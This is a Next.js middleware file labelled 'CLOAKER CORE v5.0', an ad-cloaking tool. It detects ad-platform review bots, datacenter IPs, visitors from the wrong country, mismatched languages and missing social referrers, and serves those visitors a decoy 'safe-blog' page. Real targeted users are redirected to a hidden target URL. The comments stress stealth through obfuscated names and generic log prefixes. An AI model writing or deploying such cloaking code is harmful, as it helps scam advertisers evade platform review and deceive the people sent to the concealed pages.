import { NextRequest, NextResponse } from "next/server";

/**
 * CLOAKER CORE v5.0 - Professional Grade
 * Focus: Stealth, ASN Blocking, and UTM Reliability.
 */

const T_URL = process.env.TARGET_URL || "https://google.com";
const S_PATH = "/safe-blog";

// Stealth naming for configuration
const C_L = ["BE", "DE", "PT", "BR"]; // Countries
const B_U = [
  "facebookexternalhit",
  "Facebot",
  "AdsBot-Google",
  "Googlebot",
  "Twitterbot",
  "LinkedInBot",
]; // Bots
const L_M: Record<string, string[]> = {
  BE: ["fr", "nl", "de", "en"],
  DE: ["de", "en"],
  PT: ["pt", "en"],
};
const R_L = ["facebook.com", "instagram.com", "fb.com", "t.co"]; // Allowed Referers
const U_K = "fb"; // UTM key signal (e.g. ?u=fb)

export async function middleware(req: NextRequest) {
  try {
    const { nextUrl, headers } = req;

    // 1. FAST BYPASS
    if (
      nextUrl.pathname.startsWith("/_next") ||
      nextUrl.pathname.includes(".") ||
      nextUrl.pathname === S_PATH
    ) {
      return NextResponse.next();
    }

    const ua = headers.get("user-agent") || "";
    const geo = (req as { geo?: { country?: string } }).geo;
    const ip =
      headers.get("x-forwarded-for")?.split(",")[0] ||
      headers.get("x-real-ip") ||
      "127.0.0.1";

    // --- SIGNAL A: UA CHECK ---
    if (B_U.some((b) => ua.toLowerCase().includes(b.toLowerCase()))) {
      return f_res(req, true, "S_A");
    }

    // --- SIGNAL B: GEO CHECK ---
    const reg = geo?.country || headers.get("x-vercel-ip-country") || "US";
    if (!C_L.includes(reg)) {
      return f_res(req, true, "S_B");
    }

    // --- SIGNAL C: UTM & REFERER (THE "SOCIAL" SHIELD) ---
    // We trust UTM parameter more than Referer (which can be stripped)
    const ref = headers.get("referer") || "";
    const utm = nextUrl.searchParams.get("u"); // Change key to something generic like 'u'

    const is_s = R_L.some((r) => ref.includes(r)) || utm === U_K;
    if (!is_s) {
      return f_res(req, true, "S_C");
    }

    // --- SIGNAL D: LANG CONSISTENCY ---
    const l_h = headers.get("accept-language")?.toLowerCase() || "";
    const exp = L_M[reg];
    if (exp && !exp.some((l) => l_h.includes(l))) {
      return f_res(req, true, "S_D");
    }

    // --- SIGNAL E: ASN / HOSTING (THE "DATACENTER" WALL) ---
    // This is asynchronous and crucial for professional cloaking.
    const is_h = await c_h(ip);
    if (is_h) {
      return f_res(req, true, "S_E");
    }

    // --- CLEAN TRAFFIC ---
    return f_res(req, false);
  } catch (e) {
    console.error("[C_ERR]", e);
    return NextResponse.next(); // Fail-safe to Safe Page
  }
}

/**
 * Check if IP belongs to Hosting/Datacenter/Proxy
 * Using ipapi.co (Free tier allows 30k requests/month)
 */
async function c_h(ip: string): Promise<boolean> {
  // Localhost/Private IP skip
  if (ip === "127.0.0.1" || ip.startsWith("192.168.") || ip.startsWith("10."))
    return false;

  try {
    // We use a 1s timeout to not delay the response too much
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 1000);

    const res = await fetch(`https://ipapi.co/${ip}/json/`, {
      signal: controller.signal,
    });
    const data = await res.json();
    clearTimeout(timeout);

    // Some APIs use 'hosting' field, others use 'org' or 'asn' keywords.
    // ipapi.co doesn't have a direct 'hosting' boolean in free tier,
    // but we can check the 'org' for common cloud providers.
    const b_orgs = [
      "google",
      "amazon",
      "aws",
      "microsoft",
      "azure",
      "digitalocean",
      "cloudflare",
      "hetzner",
      "ovh",
      "facebook",
      "meta",
    ];
    const org = (data.org || "").toLowerCase();

    return b_orgs.some((b) => org.includes(b));
  } catch {
    return false; // Fail-safe (assume real user if API fails)
  }
}

/**
 * Response Handler (Stealth Mode)
 */
function f_res(req: NextRequest, flag: boolean, r?: string) {
  if (flag && r) {
    // Log with generic prefix
    console.log(
      `[C_L] ${r} | ${req.headers.get("x-forwarded-for")?.split(",")[0]}`
    );
  }

  const res = flag
    ? NextResponse.next()
    : NextResponse.redirect(T_URL);

  // Anti-Cache Headers
  res.headers.set(
    "Cache-Control",
    "no-store, no-cache, must-revalidate, proxy-revalidate"
  );
  res.headers.set("Pragma", "no-cache");
  res.headers.set("Expires", "0");

  return res;
}

export const config = {
  matcher: ["/((?!api|_next/static|_next/image|favicon.ico).*)"],
};
